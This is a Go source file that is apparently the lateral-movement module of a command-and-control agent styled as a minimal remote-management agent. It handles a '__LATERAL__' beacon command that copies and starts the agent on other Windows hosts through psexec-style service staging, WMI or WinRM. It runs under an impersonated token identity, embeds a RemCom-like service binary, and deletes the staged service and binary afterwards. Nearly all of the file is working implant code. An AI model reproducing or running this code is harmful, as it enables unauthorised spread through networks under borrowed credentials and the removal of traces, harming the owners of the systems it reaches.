package main

import (
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

// embeddedLateralService carries the dedicated lateral service host with
// its linked stage1 worker inside this agent, the way RemCom embeds its
// service and extracts it at runtime. The placeholder is replaced by the
// real service host when the server builds the agent (see build_go_agent
// in server_rmm.py).
//
//go:embed lateral-service.bin
var embeddedLateralService []byte

// lateralPayload carries the lateral movement request as a JSON body on the
// __LATERAL__ beacon command, mirroring __MAKE_TOKEN__.
type lateralPayload struct {
	Method         string  `json:"method"`
	Host           string  `json:"host"`
	SessionID      string  `json:"session_id"`
	WorkspaceID    *string `json:"workspace_id,omitempty"`
	RemoteName     string  `json:"remote_name"`
	Stage          string  `json:"stage"`
	TimeoutSeconds float64 `json:"timeout_seconds"`
	HTTPS          bool    `json:"https,omitempty"`
	Insecure       bool    `json:"insecure,omitempty"`
	winrmIdentity  *winrmCredentials
}

var lateralMethods = map[string]bool{
	"psexec":  true,
	"wmiexec": true,
	"winrm":   true,
}

// lateralHostIsIP reports whether a lateral target is an IP literal rather
// than a DNS name. WMI selects NTLM for IP literals and Kerberos for DNS
// names; WSMan selects Negotiate and Kerberos respectively. SMB staging
// and psexec retain Windows negotiation and may fall back to NTLM for DNS.
func lateralHostIsIP(host string) bool {
	return net.ParseIP(strings.TrimSpace(host)) != nil
}

// The staged binary name becomes part of the service binPath, so it must be a
// simple filename without spaces or separators.
var lateralRemoteNamePattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.exe$`)

type lateralResult struct {
	result string
	err    error
}

// awaitLateralResult preserves acknowledged artifacts when the command expires.
func awaitLateralResult(ctx context.Context, results <-chan lateralResult, progress <-chan string) (string, error) {
	select {
	case r := <-results:
		return r.result, r.err
	case <-ctx.Done():
		select {
		case r := <-results:
			return r.result, r.err
		default:
		}
		select {
		case ack := <-progress:
			return ack + "\nlateral cleanup pending: command deadline exceeded; worker may still be running", nil
		default:
			return "", errors.New("lateral move timed out; the worker may still be running and the target may still be starting")
		}
	}
}

func parseLateralPayload(command string) (lateralPayload, error) {
	var payload lateralPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := rejectCommandDebugOption([]byte(parts[1])); err != nil {
		return payload, err
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	// encoding/json treats null as a no-op for bool fields. Reject it here
	// rather than silently selecting HTTP for an invalid transport option.
	var transport struct {
		HTTPS    json.RawMessage `json:"https"`
		Insecure json.RawMessage `json:"insecure"`
	}
	if err := json.Unmarshal([]byte(parts[1]), &transport); err != nil {
		return payload, err
	}
	if strings.TrimSpace(string(transport.HTTPS)) == "null" {
		return payload, errors.New("https must be a boolean")
	}
	if strings.TrimSpace(string(transport.Insecure)) == "null" {
		return payload, errors.New("insecure must be a boolean")
	}
	payload.Method = strings.ToLower(strings.TrimSpace(payload.Method))
	// The HTTPS wire method is intentionally unknown to older agents. They
	// must reject it rather than silently ignore https and connect over HTTP.
	if payload.Method == "winrm_https" {
		payload.Method, payload.HTTPS = "winrm", true
	}
	if payload.Method == "winrm_https_insecure" {
		if len(transport.Insecure) != 0 && !payload.Insecure {
			return payload, errors.New("insecure wire method conflicts with certificate validation")
		}
		payload.Method, payload.HTTPS, payload.Insecure = "winrm", true, true
	}
	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
	payload.RemoteName = strings.TrimSpace(payload.RemoteName)
	if payload.RemoteName == "" {
		payload.RemoteName = "minimal-rmm-agent.exe"
	}
	if !lateralMethods[payload.Method] {
		return payload, errors.New("method must be one of psexec, wmiexec, winrm")
	}
	if payload.HTTPS && payload.Method != "winrm" {
		return payload, errors.New("https is supported only for winrm")
	}
	if payload.Insecure && (!payload.HTTPS || payload.Method != "winrm") {
		return payload, errors.New("insecure requires winrm HTTPS")
	}
	if payload.SessionID != "" && !regexp.MustCompile(`^[A-Za-z0-9_-]{8,128}$`).MatchString(payload.SessionID) {
		return payload, errors.New("invalid target session id")
	}
	if payload.WorkspaceID != nil && *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
		return payload, errors.New("invalid workspace id")
	}
	if payload.Host == "" {
		return payload, errors.New("host is required")
	}
	if payload.Method == "psexec" {
		// The psexec module pushes the dedicated lateral service host,
		// whose only capability is the staging reference created by the
		// listener.
		if !agentSessionIDPattern.MatchString(payload.Stage) {
			return payload, errors.New("psexec requires a staging reference from the listener")
		}
	}
	if !lateralRemoteNamePattern.MatchString(payload.RemoteName) {
		return payload, errors.New("remote_name must be a simple .exe filename")
	}
	if payload.TimeoutSeconds <= 0 {
		payload.TimeoutSeconds = 300
	}
	if payload.TimeoutSeconds > 3600 {
		payload.TimeoutSeconds = 3600
	}
	return payload, nil
}

// lateralCommand handles __LATERAL__: start a copy of this agent on another
// host through the requested execution method.
//
// All methods use a pinned worker. Deadlines bound waiting, not native calls.
func lateralCommand(command string) (string, error) {
	payload, err := parseLateralPayload(command)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", errors.New("lateral movement requires the Windows agent build")
	}
	ctx, cancel := context.WithTimeout(agentContext, time.Duration(payload.TimeoutSeconds*float64(time.Second)))
	defer cancel()

	return lateralThreadGoroutine(ctx, payload)
}

// lateralCleanupPayload identifies the deployment artifacts a psexec move
// left on the target: the temporary service and its host binary.
type lateralCleanupPayload struct {
	Host        string `json:"host"`
	ServiceName string `json:"service_name"`
	BinaryName  string `json:"binary_name"`
}

// Cleanup authority belongs to this source process, not to caller-supplied
// names. After restart or an unacknowledged launch, cleanup fails closed.
var lateralCleanupOwners = struct {
	sync.Mutex
	artifacts map[lateralCleanupPayload]bool
}{artifacts: make(map[lateralCleanupPayload]bool)}

var lateralCleanupNames = regexp.MustCompile(`^service=(MinimalRmmAgent-([a-f0-9]{32})) binary=([A-Za-z0-9][A-Za-z0-9._-]*\.exe)$`)

// rememberLateralCleanup records only the exact acknowledged psexec artifacts
// returned by our child for this request, including their shared random suffix.
func rememberLateralCleanup(request lateralPayload, result string) {
	if request.Method != "psexec" || request.SessionID == "" {
		return
	}
	first, remainder, _ := strings.Cut(result, "\n")
	if strings.HasPrefix(remainder, "lateral cleanup: ") {
		return
	}
	if remainder != "" && (!strings.HasPrefix(remainder, "lateral cleanup pending: ") || strings.Contains(remainder, "\n")) {
		return
	}
	result = first
	prefix := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s ", request.Host, request.SessionID)
	if !strings.HasPrefix(result, prefix) {
		return
	}
	match := lateralCleanupNames.FindStringSubmatch(strings.TrimPrefix(result, prefix))
	if match == nil || match[3] != strings.TrimSuffix(request.RemoteName, ".exe")+"-"+match[2]+".exe" {
		return
	}
	artifact := lateralCleanupPayload{Host: request.Host, ServiceName: match[1], BinaryName: match[3]}
	lateralCleanupOwners.Lock()
	defer lateralCleanupOwners.Unlock()
	lateralCleanupOwners.artifacts[artifact] = true
}

// ownsLateralCleanup requires an exact deployment record before any deletion.
func ownsLateralCleanup(payload lateralCleanupPayload) bool {
	lateralCleanupOwners.Lock()
	defer lateralCleanupOwners.Unlock()
	return lateralCleanupOwners.artifacts[payload]
}

func parseLateralCleanupPayload(command string) (lateralCleanupPayload, error) {
	var payload lateralCleanupPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
	if payload.Host == "" {
		return payload, errors.New("host is required")
	}
	if !regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$`).MatchString(payload.ServiceName) {
		return payload, errors.New("invalid service name")
	}
	if !lateralRemoteNamePattern.MatchString(payload.BinaryName) {
		return payload, errors.New("invalid binary name")
	}
	return payload, nil
}

// lateralCleanupCommand handles __LATERAL_CLEANUP__, the server-side retry
// after a psexec move whose immediate caller-side cleanup stayed pending:
// it runs in a bounded child (with the active make_token identity through
// applyCommandToken) that waits for the launcher service to finish, then
// deletes the temporary service and its host binary on the target.
// reestablishThreadToken is called after the child exits for the same
// reason as in lateralCommand.
func lateralCleanupCommand(command string) (string, error) {
	payload, err := parseLateralCleanupPayload(command)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", errors.New("lateral movement requires the Windows agent build")
	}
	if !ownsLateralCleanup(payload) {
		return "", errors.New("cleanup artifacts are not owned by an acknowledged deployment in this agent process")
	}
	self, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	encoded, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}
	ctx, cancel := context.WithTimeout(agentContext, 2*time.Minute)
	defer cancel()
	child := newBoundedCommand(ctx, self, "--lateral-cleanup-child", string(encoded))
	applyCommandToken(child)
	out, err := child.CombinedOutput()
	reestablishThreadToken()
	if err != nil {
		if message := strings.TrimSpace(string(out)); message != "" {
			return "", errors.New(message)
		}
		return "", fmt.Errorf("lateral cleanup child failed: %w", err)
	}
	result := strings.TrimSpace(string(out))
	if !strings.HasPrefix(result, "lateral cleanup: ") {
		return "", fmt.Errorf("cleanup did not confirm success: %s", result)
	}
	lateralCleanupOwners.Lock()
	delete(lateralCleanupOwners.artifacts, payload)
	lateralCleanupOwners.Unlock()
	return result, nil
}
